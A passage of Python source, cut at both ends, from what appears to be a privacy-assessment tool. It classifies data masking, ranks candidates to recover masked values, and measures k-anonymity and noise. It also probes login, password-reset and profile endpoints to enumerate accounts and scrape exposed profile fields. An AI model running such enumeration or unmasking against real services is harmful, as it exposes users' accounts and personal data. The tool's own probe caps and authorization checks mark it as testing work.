        best_sim, best_rule = scored_rules[0]
        agreement = sum(1 for s, _ in scored_rules if s > 0.85)
        consensus = min(1.0, agreement / max(1, len(scored_rules)))
        pool: set = set(self.dictionary) | set(self.model.word_priors)
        if known_plaintext:
            pool.add(known_plaintext.strip())
        pl = best_rule["prefix_length"]
        sl = best_rule["suffix_length"]
        surviving = []
        for word in sorted(pool):
            w = word.strip().lower()
            if not w:
                continue
            if pl and not w.startswith(best_rule["original"][:pl]):
                continue
            if sl and not w.endswith(best_rule["original"][-sl:]):
                continue
            surviving.append(w)
        ranked = self.model.rank(masked, surviving,
                                  field_type=self.detect_value_type(
                                      masked, field_hint))
        top = [c for _, c in ranked[:20]]
        ci = self.model.interval(ranked)
        rule_factor = min(1.0, len(self.learned_rules) / 5.0)
        conf = clamp((0.30 * best_sim + 0.35 * consensus
                      + 0.35 * ci["confidence"]) * rule_factor, 0.0, 0.90)
        return AnalyzerResult(
            method_family="learned_rule_bayesian", confidence=conf,
            details={"learned_from": best_rule["original"],
                     "learned_mask": best_rule["masked"],
                     "skeleton_similarity": round(best_sim, 3),
                     "rule_agreement": round(consensus, 3),
                     "rule_count": len(self.learned_rules),
                     "rule_factor": round(rule_factor, 3)},
            candidates=top, ci=ci["ci"])

    def analyze(self, masked: str, known_plaintext: str = "",
                field_hint: str = "") -> List[AnalyzerResult]:
        masked = masked.strip()
        results = [
            self.beginner_fixed_mask(masked),
            self.intermediate_partial_mask(masked),
            self.advanced_format_aware(masked, known_plaintext, field_hint),
            self.hyper_adaptive(masked, known_plaintext, field_hint),
        ]
        return [r for r in results if r]

@dataclass
class Classification:
    technique_id: str
    technique: str
    confidence: float
    ci: List[float]
    details: Dict[str, Any]
    algorithmically_reversible: bool
    authorized_recovery_available: bool
    recovery_path: Literal[
        "detokenization_api", "vault_lookup", "kms_decrypt",
        "known_plaintext", "none"]

    def to_dict(self) -> dict:
        return {
            "technique_id": self.technique_id,
            "technique": self.technique,
            "confidence": round(self.confidence, 4),
            "ci": self.ci,
            "details": self.details,
            "algorithmically_reversible": self.algorithmically_reversible,
            "authorized_recovery_available":
                self.authorized_recovery_available,
            "recovery_path": self.recovery_path,
        }


class ObfuscationTechniqueClassifier:
    def classify(self, field: str, value: str, context: dict
                 ) -> Classification:
        value = str(value)
        if not value:
            return self._mk("empty_value", "Full redaction / nulling",
                            0.95, {"reason": "empty"}, False, "none")
        lowered = value.strip().lower()
        if lowered in GENERIC_REDACTIONS:
            return self._mk("full_redaction",
                            "Full redaction / nulling out", 0.95,
                            {"placeholder": value}, False, "none")
        if looks_like_api_key(value):
            return self._mk("key_material",
                            "API key / session token (not obfuscation)",
                            0.90, {"reason": "api-key-shape"},
                            False, "vault_lookup")
        if TOKEN_LIKE.fullmatch(value) and not looks_like_api_key(value):
            return self._mk("tokenization_or_pseudonymization",
                            "Tokenization or pseudonymization", 0.80,
                            {"reason": "high-entropy opaque token"},
                            False, "detokenization_api")
        if has_mask(value):
            return self._classify_mask(value, context)
        if BINNED_VALUE.match(value):
            return self._mk("generalization_or_binning",
                            "Generalization / quantile binning", 0.80,
                            {"value": value}, False, "none")
        id_type = self._detect_id_structure(value)
        if id_type:
            return self._mk(f"structured_identifier_{id_type}",
                            "Structured identifier (checksum-validatable)",
                            0.70, {"id_type": id_type}, False, "none")
        if self._looks_scrambled(value):
            return self._mk("character_scrambling_or_generative",
                            "Character scrambling / substitution / "
                            "generative obfuscation", 0.55,
                            {"reason": "well-formed but no morphemes"},
                            False, "none")
        return self._mk("unknown_or_plaintext",
                        "Unknown / possibly plaintext", 0.30,
                        {"reason": "no strong signature"}, False, "none")

    @staticmethod
    def _detect_id_structure(v: str) -> str:
        if ID_STRUCTURES["ssn_us"].match(v):
            return "ssn_us"
        if ID_STRUCTURES["iban"].match(v) and IDChecksum.iban(v):
            return "iban"
        if ID_STRUCTURES["aadhaar"].match(v):
            return "aadhaar"
        if ID_STRUCTURES["luhn"].match(v) and IDChecksum.luhn(v):
            return "luhn"
        return ""

    @staticmethod
    def _looks_scrambled(value: str) -> bool:
        if not re.fullmatch(r"[A-Za-z0-9_-]+", value) or len(value) < 6:
            return False
        words = re.findall(r"[a-z]+", value.lower())
        if any(w in BASE_DICTIONARY or w in COMMON_WORDS for w in words):
            return False
        return shannon_entropy(value) >= 2.8

    def _classify_mask(self, value: str, context: dict
                       ) -> Classification:
        mask_chars = [c for c in value if c in MASK_SYMBOLS]
        mask_groups = MASK_RUN.findall(value)
        fixed_width = (len(set(mask_chars)) == 1
                       and len(mask_groups) == 1)
        format_preserving = bool(re.search(r"[@\s\-\(\)\+]", value))
        if fixed_width and len(mask_chars) in (3, 4, 6):
            tid, tname = ("fixed_width_padding_masking",
                          "Fixed-width padding masking")
        elif format_preserving:
            tid, tname = ("format_preserving_masking",
                          "Format-preserving masking")
        else:
            tid, tname = "partial_masking", "Partial masking"
        conf = 0.75 if context.get("training_available") else 0.55
        return Classification(
            technique_id=tid, technique=tname, confidence=conf,
            ci=[max(0.0, conf - 0.10), min(1.0, conf + 0.10)],
            details={"mask_symbols": sorted(set(mask_chars)),
                     "mask_symbol_count": len(mask_chars),
                     "format_preserving": format_preserving,
                     "fixed_width": fixed_width},
            algorithmically_reversible=True,
            authorized_recovery_available=True,
            recovery_path="known_plaintext")

    @staticmethod
    def _mk(tid: str, tname: str, conf: float,
            details: dict, reversible: bool,
            path: str) -> Classification:
        return Classification(
            technique_id=tid, technique=tname, confidence=conf,
            ci=[max(0.0, conf - 0.10), min(1.0, conf + 0.10)],
            details=details, algorithmically_reversible=reversible,
            authorized_recovery_available=(path != "none"),
            recovery_path=path)


class RepeatedReadAnalyzer:
    def __init__(self, samples: List[Any],
                 sensitivity: Optional[float] = None):
        self.samples = [s for s in samples if s is not None]
        self.sensitivity = sensitivity

    def analyze(self) -> Optional[dict]:
        if len(self.samples) < 3:
            return None
        unique = set(map(str, self.samples))
        if len(unique) == 1:
            return {"verdict": "stable", "samples": len(self.samples)}
        try:
            nums = [float(x) for x in self.samples]
        except (TypeError, ValueError):
            return {"verdict": "categorical_noise",
                    "samples": len(self.samples),
                    "unique_values": len(unique)}
        if len(set(nums)) == 1:
            return {"verdict": "stable", "samples": len(nums)}
        mean = statistics.fmean(nums)
        var = statistics.pvariance(nums)
        if var == 0:
            return {"verdict": "stable", "samples": len(nums)}
        b = math.sqrt(var / 2.0)
        sigma = math.sqrt(var)
        delta = 1e-5
        eps_l = (self.sensitivity / b) if (
            self.sensitivity and b > 0) else None
        eps_g = (self.sensitivity * math.sqrt(2 * math.log(1.25 / delta))
                 / sigma) if (self.sensitivity and sigma > 0) else None
        return {
            "verdict": "numeric_noise",
            "samples": len(nums), "mean": round(mean, 4),
            "variance": round(var, 4),
            "noise_scale_laplace_b": round(b, 4),
            "noise_scale_gaussian_sigma": round(sigma, 4),
            "sensitivity_assumption": self.sensitivity,
            "epsilon_laplace_if_sensitivity_1": (
                round(1.0 / b, 4) if b > 0 else None),
            "epsilon_gaussian_if_sensitivity_1_delta_1e-5": (
                round(math.sqrt(2 * math.log(1.25 / delta)) / sigma, 4)
                if sigma > 0 else None),
            "epsilon_laplace_with_declared_sensitivity": (
                round(eps_l, 4) if eps_l is not None else None),
            "epsilon_gaussian_with_declared_sensitivity": (
                round(eps_g, 4) if eps_g is not None else None),
        }


class DifferentialAnalyzer:
    MIN_ACCOUNTS = 5

    def __init__(self, accounts: Dict[str, Dict[str, Any]],
                 known_plaintext: Optional[Dict[str, str]] = None):
        self.accounts = accounts
        self.known = known_plaintext or {}

    def deterministic_masking(self, field: str) -> Optional[dict]:
        values = {}
        for acc_id, prof in self.accounts.items():
            flat = flatten_json(prof)
            v = flat.get(field)
            if isinstance(v, str) and has_mask(v):
                values[acc_id] = v
        if len(values) < 2:
            return None
        if len(set(values.values())) < len(values):
            return {"field": field,
                    "verdict": "deterministic_masking_likely",
                    "examples": values}
        return {"field": field, "verdict": "unique_masks"}

    def shuffle_detection(self, field: str) -> Optional[dict]:
        if not self.known:
            return None
        inverted_accounts = set()
        for acc_id, prof in self.accounts.items():
            observed = flatten_json(prof).get(field)
            if not isinstance(observed, str):
                continue
            for other_id, other_true in self.known.items():
                if other_id == acc_id:
                    continue
                if observed == other_true:
                    inverted_accounts.add(acc_id)
                    break
        if not self.accounts:
            return None
        ratio = len(inverted_accounts) / len(self.accounts)
        if ratio >= 0.5:
            return {"field": field, "verdict": "shuffle_likely",
                    "inverted_accounts": len(inverted_accounts),
                    "total_accounts": len(self.accounts),
                    "inversion_rate": round(ratio, 3)}
        return {"field": field, "verdict": "shuffle_unlikely",
                "inversion_rate": round(ratio, 3)}

    def k_anonymity(self, quasi_identifiers: Sequence[str],
                    sensitive: Optional[str] = None) -> Optional[dict]:
        if len(self.accounts) < self.MIN_ACCOUNTS:
            return {"verdict": "insufficient_sample",
                    "accounts": len(self.accounts),
                    "required": self.MIN_ACCOUNTS}
        groups: Dict[Tuple, List[str]] = defaultdict(list)
        for prof in self.accounts.values():
            flat = flatten_json(prof)
            key = tuple(str(flat.get(q, "")) for q in quasi_identifiers)
            groups[key].append(str(flat.get(sensitive, ""))
                               if sensitive else "")
        sizes = sorted(len(v) for v in groups.values())
        k = sizes[0]
        out: Dict[str, Any] = {
            "quasi_identifiers": list(quasi_identifiers), "k": k,
            "cohort_sizes": sizes,
            "verdict": ("k_anonymity_violation" if k < 2
                        else "k_anonymity_present")}
        if sensitive and k >= 1:
            entropy_l = []
            distinct_l = []
            for members in groups.values():
                vals = [v for v in members if v]
                if not vals:
                    entropy_l.append(0.0)
                    distinct_l.append(0)
                    continue
                cnt = Counter(vals)
                n = len(vals)
                entropy_l.append(-sum((c / n) * math.log2(c / n)
                                       for c in cnt.values()))
                distinct_l.append(len(cnt))
            out["l_diversity_entropy"] = round(min(entropy_l), 4)
            out["l_diversity_distinct"] = min(distinct_l)
            global_vals = [flatten_json(p).get(sensitive, "")
                           for p in self.accounts.values()]
            global_vals = [v for v in global_vals if v]
            if global_vals:
                gc = Counter(global_vals)
                gn = len(global_vals)
                global_dist = {k: c / gn for k, c in gc.items()}
                emds = []
                for members in groups.values():
                    vals = [v for v in members if v]
                    if not vals:
                        continue
                    gcn = Counter(vals)
                    gn_local = len(vals)
                    local = {k: c / gn_local for k, c in gcn.items()}
                    keys = set(local) | set(global_dist)
                    emd = 0.5 * sum(
                        abs(local.get(k, 0) - global_dist.get(k, 0))
                        for k in keys)
                    emds.append(emd)
                out["t_closeness"] = (round(max(emds), 4)
                                      if emds else None)
        return out


class RoleDiffAnalyzer:
    def __init__(self, label_a: str, label_b: str,
                 profile_a: Dict[str, Any], profile_b: Dict[str, Any]):
        self.label_a, self.label_b = label_a, label_b
        self.a, self.b = profile_a, profile_b

    def analyze(self) -> dict:
        diffs: Dict[str, dict] = {}
        flat_a = flatten_json(self.a)
        flat_b = flatten_json(self.b)
        for k in set(flat_a) | set(flat_b):
            va, vb = flat_a.get(k), flat_b.get(k)
            if isinstance(va, str) and isinstance(vb, str) and va != vb:
                if has_mask(va) != has_mask(vb):
                    diffs[k] = {
                        self.label_a: va, self.label_b: vb,
                        "interpretation": "conditional_masking",
                    }
        return {"diff_fields": diffs,
                "verdict": ("role_based_masking_likely" if diffs
                            else "no_role_difference_observed")}


def fingerprint_response(body: Any,
                         endpoint_path: str = "") -> Optional[dict]:
    if not isinstance(body, dict):
        return None
    keys = {k.lower() for k in body}
    blob = " ".join(keys) + " " + endpoint_path.lower()
    if CRYPTO_FALSE_POSITIVE.search(blob) and len(keys) < 4:
        return None
    hits: Dict[str, List[str]] = {}
    for scheme, markers in CRYPTO_MARKERS.items():
        found = [m for m in markers if any(m in k for k in keys)]
        if len(found) >= 2:
            hits[scheme] = found
    if not hits:
        return None
    return {"verdict": "cryptographic_endpoint_fingerprint",
            "schemes": hits,
            "strength": ("strong" if any(len(v) >= 3
                                          for v in hits.values())
                         else "moderate")}


class BinningAnalyzer:
    def __init__(self, samples: List[float]):
        self.samples = sorted(samples)

    def analyze(self) -> Optional[dict]:
        if len(self.samples) < 5:
            return None
        unique = sorted(set(self.samples))
        if len(unique) < 3:
            return {"verdict": "insufficient_distinct_values",
                    "unique_values": len(unique)}
        diffs = [unique[i + 1] - unique[i]
                 for i in range(len(unique) - 1)]
        mean_diff = statistics.fmean(diffs)
        var_diff = statistics.pvariance(diffs)
        equal_width = (mean_diff != 0 and len(diffs) >= 3
                       and (var_diff / (mean_diff ** 2)) < 1e-3)
        positive = [v for v in unique if v > 0]
        log_equal_width = False
        if len(positive) >= 4 and len(positive) == len(unique):
            logs = [math.log(v) for v in positive]
            log_diffs = [logs[i + 1] - logs[i]
                         for i in range(len(logs) - 1)]
            if log_diffs:
                lm = statistics.fmean(log_diffs)
                lv = statistics.pvariance(log_diffs)
                log_equal_width = (lm != 0 and (lv / (lm ** 2)) < 1e-2)
        equal_freq = False
        if (len(unique) >= 5 and len(self.samples) >= 20
                and len(unique) <= len(self.samples) // 3):
            counts = Counter(self.samples)
            freq_values = list(counts.values())
            mean_f = statistics.fmean(freq_values)
            equal_freq = (mean_f > 0
                          and statistics.pvariance(freq_values)
                          / (mean_f ** 2) < 0.05)
        verdict = "no_clear_binning"
        if equal_width:
            verdict = "equal_width_binning"
        elif log_equal_width:
            verdict = "log_scale_binning"
        elif equal_freq:
            verdict = "equal_frequency_binning"
        return {"verdict": verdict, "unique_values": len(unique),
                "samples": len(self.samples)}


class SemanticPlausibility:
    def __init__(self, dictionary: Optional[Iterable[str]] = None):
        self.dictionary = set(dictionary or BASE_DICTIONARY)
        self.bigrams = Counter()
        for word in self.dictionary:
            w = f"<{word.lower()}>"
            for i in range(len(w) - 1):
                self.bigrams[w[i:i + 2]] += 1
        self.bigram_total = sum(self.bigrams.values()) or 1
        self.baseline = 0.0
        if self.dictionary:
            vals = [self._raw_plausibility(w) for w in self.dictionary]
            self.baseline = statistics.fmean(vals) if vals else 0.0

    def _raw_plausibility(self, value: str) -> float:
        if not value:
            return 0.0
        tokens = re.findall(r"[a-z]+", value.lower())
        if not tokens:
            return 0.0
        log_probs = []
        for t in tokens:
            w = f"<{t}>"
            if len(w) < 2:
                log_probs.append(-10.0)
                continue
            for b in [w[i:i + 2] for i in range(len(w) - 1)]:
                count = self.bigrams.get(b, 0)
                p = (count + 1) / (self.bigram_total + len(self.bigrams))
                log_probs.append(math.log(p))
        if not log_probs:
            return 0.0
        return math.exp(statistics.fmean(log_probs))

    def plausibility(self, value: str) -> float:
        return self._raw_plausibility(value)

    def analyze(self, value: str) -> dict:
        p = self.plausibility(value)
        tokens = re.findall(r"[a-z]+", value.lower())
        unknown = 0
        total = 0
        for t in tokens:
            w = f"<{t}>"
            for i in range(len(w) - 1):
                total += 1
                if self.bigrams.get(w[i:i + 2], 0) == 0:
                    unknown += 1
        unknown_ratio = unknown / max(total, 1)
        looks_fake = (unknown_ratio >= 0.8
                      and bool(re.fullmatch(r"[A-Za-z0-9._%+\-]+", value)))
        return {"plausibility": round(p, 10),
                "baseline": round(self.baseline, 10),
                "unknown_bigram_ratio": round(unknown_ratio, 3),
                "verdict": ("possibly_generative" if looks_fake
                            else "plausible_real_value")}


def _response_signature(resp: Optional[_SafeResponse],
                        identifier: Optional[Identifier],
                        baseline: str) -> Optional[dict]:
    if resp is None:
        return None
    body = resp.text or ""
    if identifier is not None:
        body = body.replace(identifier.raw, "<ID>")
        body = body.replace(identifier.normalized, "<ID>")
        if identifier.e164:
            body = body.replace(identifier.e164, "<ID>")
    body = body.replace(baseline, "<ID>")
    h = hashlib.sha256(body.encode()).hexdigest()[:16]
    return {"status": resp.status_code, "size": len(resp.content or b""),
            "hash": h, "mask_leak": has_mask_leak(body)}


def _response_diff(sig_id: Optional[dict],
                   sig_base: Optional[dict]) -> Optional[dict]:
    if sig_id is None or sig_base is None:
        return None
    diffs: Dict[str, Any] = {}
    if sig_id["status"] != sig_base["status"]:
        diffs["status"] = {
            "with_identifier": sig_id["status"],
            "with_baseline": sig_base["status"]}
    if sig_id["hash"] != sig_base["hash"]:
        diffs["body_differs"] = True
    size_max = max(sig_id["size"], sig_base["size"], 1)
    size_delta = abs(sig_id["size"] - sig_base["size"]) / size_max
    if size_delta > 0.05:
        diffs["size_delta_ratio"] = round(size_delta, 3)
    if sig_id["mask_leak"] and not sig_base["mask_leak"]:
        diffs["mask_leak"] = True
    return diffs if diffs else None


class EnumerationAnalyzer:
    MAX_PROBES = 15

    def __init__(self, client: AuthorizedClient, identifier: Identifier,
                 login_url: str, username_field: str,
                 password_field: str, safe_only: bool = False):
        self.client = client
        self.identifier = identifier
        self.login_url = login_url
        self.username_field = username_field
        self.password_field = password_field
        self.safe_only = safe_only
        self.probes = 0
        self.baseline = self._baseline()
        self.quoted_id = urllib.parse.quote(
            self.identifier.normalized, safe="")
        self.quoted_baseline = urllib.parse.quote(self.baseline, safe="")

    def _baseline(self) -> str:
        if self.identifier.type == "email":
            return f"{BASELINE_RANDOM_PREFIX}" \
                   f"{os.urandom(4).hex()}@example.invalid"
        if self.identifier.type == "phone":
            return "+10000000000"
        return f"{BASELINE_RANDOM_PREFIX}{os.urandom(4).hex()}"

    def _stop(self) -> bool:
        return self.probes >= self.MAX_PROBES

    def _probe_get(self, path: str) -> Optional[_SafeResponse]:
        if self._stop():
            return None
        self.probes += 1
        LOG.log("enum_probe", level="verbose",
                msg=f"GET {path}", path=path)
        return self.client.get_soft(path)

    def _probe_post(self, path: str,
                    payload: dict) -> Optional[_SafeResponse]:
        if self._stop():
            return None
        self.probes += 1
        LOG.log("enum_probe", level="verbose",
                msg=f"POST {path}", path=path,
                payload_keys=list(payload.keys()))
        return self.client.post_json_soft(path, payload)

    def _sig(self, resp: Optional[_SafeResponse]) -> Optional[dict]:
        return _response_signature(resp, self.identifier, self.baseline)

    def analyze(self) -> dict:
        LOG.log("enum_start",
                msg=f"identifier type={self.identifier.type} "
                    f"baseline_len={len(self.baseline)} "
                    f"safe_only={self.safe_only}")
        findings: Dict[str, Any] = {}
        if not self.safe_only:
            findings["login_error_diff"] = self._test_login_diff()
            findings["forgot_password"] = self._test_forgot_password()
        else:
            LOG.log("enum_probe", level="verbose",
                    msg="skipping login_diff and forgot_password "
                        "(safe_only mode)")
        findings["check_username"] = self._test_check_username()
        findings["public_profile"] = self._test_public_profile()
        for name, res in findings.items():
            if res and res.get("verdict", "").endswith("_differs"):
                LOG.log("enum_finding",
                        msg=f"{name}: {res.get('verdict')}")
        return {"baseline_len": len(self.baseline),
                "identifier_type": self.identifier.type,
                "safe_only": self.safe_only,
                "probes_run": self.probes,
                "probes_max": self.MAX_PROBES,
                "findings": {k: v for k, v in findings.items() if v}}

    def _test_login_diff(self) -> Optional[dict]:
        base_payload = {self.username_field: self.identifier.normalized,
                        self.password_field: "wrong_pw_deliberate_9x7z"}
        base_payload_bl = {self.username_field: self.baseline,
                           self.password_field: "wrong_pw_deliberate_9x7z"}
        r1 = self._probe_post(self.login_url, base_payload)
        if r1 is None:
            return None
        r2 = self._probe_post(self.login_url, base_payload_bl)
        diff = _response_diff(self._sig(r1), self._sig(r2))
        if diff:
            return {"verdict": "login_error_differs", "diff": diff}
        return {"verdict": "login_error_consistent"}

    def _test_forgot_password(self) -> Optional[dict]:
        candidates = ["/api/forgot-password", "/api/auth/forgot",
                      "/api/password/forgot", "/forgot-password",
                      "/api/auth/forgot-password", "/api/recover"]
        for path in candidates:
            p_id = {self.username_field: self.identifier.normalized}
            p_bl = {self.username_field: self.baseline}
            r1 = self._probe_post(path, p_id)
            if r1 is None or r1.status_code == 404:
                continue
            r2 = self._probe_post(path, p_bl)
            diff = _response_diff(self._sig(r1), self._sig(r2))
            if diff:
                return {"endpoint": path,
                        "verdict": "forgot_password_differs",
                        "diff": diff}
            return {"endpoint": path,
                    "verdict": "forgot_password_consistent"}
        return None

    def _test_check_username(self) -> Optional[dict]:
        paths = [
            f"/api/check-username/{self.quoted_id}",
            f"/api/users/exists?username={self.quoted_id}",
            f"/api/users/check/{self.quoted_id}",
            f"/api/auth/check?identifier={self.quoted_id}"]
        for path in paths:
            r1 = self._probe_get(path)
            if r1 is None or r1.status_code == 404:
                continue
            base_path = path.replace(self.quoted_id, self.quoted_baseline)
            r2 = self._probe_get(base_path)
            diff = _response_diff(self._sig(r1), self._sig(r2))
            safe_path = path.split("?")[0].replace(self.quoted_id, "{id}")
            if diff:
                return {"endpoint": "GET " + safe_path,
                        "verdict": "check_endpoint_differs",
                        "diff": diff}
            return {"endpoint": "GET " + safe_path,
                    "verdict": "check_endpoint_consistent"}
        return None

    def _test_public_profile(self) -> Optional[dict]:
        paths = [
            f"/api/users/{self.quoted_id}",
            f"/api/profile/{self.quoted_id}",
            f"/users/{self.quoted_id}",
            f"/profile/{self.quoted_id}"]
        for path in paths:
            r1 = self._probe_get(path)
            if r1 is None or r1.status_code == 404:
                continue
            base_path = path.replace(self.quoted_id, self.quoted_baseline)
            r2 = self._probe_get(base_path)
            diff = _response_diff(self._sig(r1), self._sig(r2))
            safe_path = path.split("?")[0].replace(self.quoted_id, "{id}")
            if diff:
                return {"endpoint": "GET " + safe_path,
                        "verdict": "profile_differs",
                        "diff": diff}
            return {"endpoint": "GET " + safe_path,
                    "verdict": "profile_consistent"}
        return None


class TargetValidator:
    def __init__(self, timeout: float = 5.0):
        self.timeout = timeout

    def resolve(self, host: str) -> Dict[str, Any]:
        out: Dict[str, Any] = {
            "host": host,
            "ipv4": [],
            "ipv6": [],
            "domain": None,
            "subdomain": None,
            "registrable": None,
            "errors": [],
        }
        try:
            infos = socket.getaddrinfo(host, None,
                                       proto=socket.IPPROTO_TCP)
        except socket.gaierror as e:
            out["errors"].append(f"getaddrinfo: {e}")
            infos = []
        seen_v4, seen_v6 = set(), set()
        for info in infos:
            family, _, _, _, sockaddr = info
            ip = sockaddr[0]
            try:
                parsed = ipaddress.ip_address(ip)
            except ValueError:
                continue
            if parsed.version == 4 and ip not in seen_v4:
                seen_v4.add(ip)
                out["ipv4"].append(ip)
            elif parsed.version == 6 and ip not in seen_v6:
                seen_v6.add(ip)
                out["ipv6"].append(ip)
        if _DNS_AVAILABLE and not out["ipv4"] and not out["ipv6"]:
            for rtype, key in (("A", "ipv4"), ("AAAA", "ipv6")):
                try:
                    answers = _dns.resolver.resolve(host, rtype,
                                                    lifetime=self.timeout)
                    for ans in answers:
                        ip = str(ans)
                        try:
                            parsed = ipaddress.ip_address(ip)
                        except ValueError:
                            continue
                        if ip not in out[key]:
                            out[key].append(ip)
                except Exception as e:
                    out["errors"].append(f"{rtype}: {e}")
        parts = host.lower().split(".")
        if len(parts) >= 2:
            out["registrable"] = ".".join(parts[-2:])
            if len(parts) > 2:
                out["subdomain"] = ".".join(parts[:-2])
                out["domain"] = out["registrable"]
            else:
                out["domain"] = out["registrable"]
        else:
            out["domain"] = host
        return out

    def validate(self, target_url: str) -> Dict[str, Any]:
        parsed = urlparse(target_url)
        host = parsed.hostname or ""
        result = {
            "target_url": redact_url_for_log(target_url),
            "scheme": parsed.scheme,
            "port": parsed.port or (443 if parsed.scheme == "https"
                                    else 80),
            "host": host,
            "reachable": False,
            "http_status": None,
            "tls_ok": False,
            "dns": {},
        }
        LOG.log("target", msg=f"validating {host}")
        result["dns"] = self.resolve(host)
        LOG.log("target",
                msg=f"ipv4={result['dns']['ipv4']} "
                    f"ipv6={result['dns']['ipv6']} "
                    f"domain={result['dns']['domain']} "
                    f"subdomain={result['dns']['subdomain']}")
        try:
            with socket.create_connection(
                    (host, result["port"]), timeout=self.timeout):
                result["reachable"] = True
        except OSError as e:
            LOG.log("warn", msg=f"tcp connect failed: {e}")
        return result

class AccountRecon:
    def __init__(self, client: AuthorizedClient,
                 identifier: Identifier, login_url: str,
                 username_field: str):
        self.client = client
        self.identifier = identifier
        self.login_url = login_url
        self.username_field = username_field

    def find_public_endpoint(self) -> Optional[Dict[str, Any]]:
        quoted = urllib.parse.quote(self.identifier.normalized, safe="")
        baseline = f"{BASELINE_RANDOM_PREFIX}{os.urandom(4).hex()}"
        quoted_bl = urllib.parse.quote(baseline, safe="")
        candidates = [
            f"/api/users/{quoted}",
            f"/api/v1/users/{quoted}",
            f"/api/v2/users/{quoted}",
            f"/api/profile/{quoted}",
            f"/users/{quoted}",
            f"/profile/{quoted}",
            f"/u/{quoted}",
        ]
        for real_path in candidates:
            r_real = self.client.get_soft(real_path)
            if r_real is None or r_real.status_code == 404:
                continue
            bl_path = real_path.replace(quoted, quoted_bl)
            r_bl = self.client.get_soft(bl_path)
            if r_bl is None:
                continue
            if r_real.status_code == 200 and r_bl.status_code in (
                    404, 400, 410):
                LOG.log("recon",
                        msg=f"public endpoint: {real_path}")
                return {
                    "endpoint": real_path,
                    "baseline_path": bl_path,
                    "real_response": r_real,
                    "baseline_response": r_bl,
                    "baseline_value": baseline,
                }
            if r_real.status_code == 200 and r_bl.status_code == 200:
                try:
                    body_a = r_real.json()
                    body_b = r_bl.json()
                except ValueError:
                    continue
                if body_a != body_b:
                    LOG.log("recon",
                            msg=f"public endpoint (distinct bodies): "
                                f"{real_path}")
                    return {
                        "endpoint": real_path,
                        "baseline_path": bl_path,
                        "real_response": r_real,
                        "baseline_response": r_bl,
                        "baseline_value": baseline,
                    }
        return None

    def classify_visibility(self, profile: Any) -> Dict[str, Any]:
        out: Dict[str, Any] = {
            "visibility": "unknown",
            "signals": [],
        }
        if not isinstance(profile, dict):
            return out
        flat = flatten_json(profile)
        for k, v in flat.items():
            leaf = k.split(".")[-1].split("[")[0].lower()
            if not VISIBILITY_KEYS.search(leaf):
                continue
            if isinstance(v, bool):
                if v and any(t in leaf for t in ("private", "is_private")):
                    out["visibility"] = "private"
                    out["signals"].append(f"{k}=true")
                elif v and any(t in leaf for t in ("public", "is_public")):
                    out["visibility"] = "public"
                    out["signals"].append(f"{k}=true")
            elif isinstance(v, str):
                lv = v.strip().lower()
                if lv in PRIVATE_TRUE_VALUES:
                    out["visibility"] = "private"
                    out["signals"].append(f"{k}={v}")
                elif lv in PUBLIC_TRUE_VALUES:
                    out["visibility"] = "public"
                    out["signals"].append(f"{k}={v}")
        return out

    def extract_public_id(self, profile: Any) -> Dict[str, Any]:
        out: Dict[str, Any] = {"id": None, "id_shape": "unknown",
                                "id_key": None}
        if not isinstance(profile, dict):
            return out
        flat = flatten_json(profile)
        for k, v in flat.items():
            leaf = k.split(".")[-1].split("[")[0]
            if not PUBLIC_ID_KEYS.match(leaf):
                continue
            if isinstance(v, (str, int)) and str(v):
                out["id"] = str(v)
                out["id_shape"] = classify_id_shape(str(v))
                out["id_key"] = k
                return out
        return out

    def scrape_profile(self, profile: Any) -> Dict[str, Any]:
        out = {"fields": {}, "field_count": 0, "public_field_count": 0}
        if not isinstance(profile, dict):
            return out
        flat = flatten_json(profile)
        for k, v in flat.items():
            if isinstance(v, (dict, list)):
                continue
            short = extract_leaf_field_name(k)
            if short is None:
                continue
            out["fields"][k] = v
        out["field_count"] = len(flat)
        out["public_field_count"] = len(out["fields"])
        return out

    def run(self) -> Dict[str, Any]:
        result: Dict[str, Any] = {
            "identifier_type": self.identifier.type,
            "public_endpoint": None,
            "public_endpoint_status": None,
            "baseline_status": None,
            "profile_raw": None,
            "id": None,
            "id_shape": "unknown",
            "id_key": None,
            "visibility": "unknown",
            "visibility_signals": [],
            "public_fields": {},
            "field_count": 0,
            "public_field_count": 0,
        }
        found = self.find_public_endpoint()
        if not found:
            LOG.log("recon",
                    msg="no public endpoint leaked the profile")
            return result
        result["public_endpoint"] = found["endpoint"]
        result["public_endpoint_status"] = \
            found["real_response"].status_code
        result["baseline_status"] = found["baseline_response"].status_code
        body = None
        ct = found["real_response"].headers.get(
            "content-type", "").lower()
        if "json" in ct:
            try:
                body = found["real_response"].json()
            except ValueError:
                body = found["real_response"].text[:2000]
        else:
            body = found["real_response"].text[:2000]
        result["profile_raw"] = body
        ident = self.extract_public_id(body)
        result["id"] = ident["id"]
        result["id_shape"] = ident["id_shape"]
        result["id_key"] = ident["id_key"]
        vis = self.classify_visibility(body)
        result["visibility"] = vis["visibility"]
        result["visibility_signals"] = vis["signals"]
        scraped = self.scrape_profile(body)
        result["public_fields"] = scraped["fields"]
        result["field_count"] = scraped["field_count"]
        result["public_field_count"] = scraped["public_field_count"]
        LOG.log("recon",
                msg=f"id={result['id']} ({result['id_shape']}) "
                    f"visibility={result['visibility']} "
                    f"public_fields={result['public_field_count']}/"
                    f"{result['field_count']}")
        for k, v in list(result["public_fields"].items())[:20]:
            LOG.log("recon", level="verbose",
                    msg=f"  {k}: {str(v)[:120]}")
        return result


class LoginFlowProber:
    def __init__(self, client: AuthorizedClient,
                 identifier: Identifier, login_url: str,
                 username_field: str, password_field: str):
        self.client = client
        self.identifier = identifier
        self.login_url = login_url
        self.username_field = username_field
        self.password_field = password_field
        self.cascade = StringCascade()

    def _analyze_fields_required(self, resp_text: str,
                                 resp_status: int) -> Dict[str, Any]:
        out: Dict[str, Any] = {
            "field_names": [],
            "raw_preview": resp_text[:300],
            "status": resp_status,
        }
        if not resp_text:
            return out
        try:
            body = json.loads(resp_text)
        except ValueError:
            body = None
        if isinstance(body, dict):
            for key in ("required", "fields", "missing", "field",
                        "required_fields", "errors"):
                v = body.get(key)
                if isinstance(v, list):
                    for item in v:
                        if isinstance(item, str):
                            out["field_names"].append(item)
                        elif isinstance(item, dict):
                            for kk in item.keys():
                                out["field_names"].append(kk)
                elif isinstance(v, str):
                    out["field_names"].append(v)
                elif isinstance(v, dict):
                    for kk in v.keys():
                        out["field_names"].append(kk)
            for k in body.keys():
                if isinstance(k, str) and k not in (
                        "error", "message", "detail", "status"):
                    if k.lower() in ("username", "email", "phone",
                                      "password", "identifier", "user"):
                        if k not in out["field_names"]:
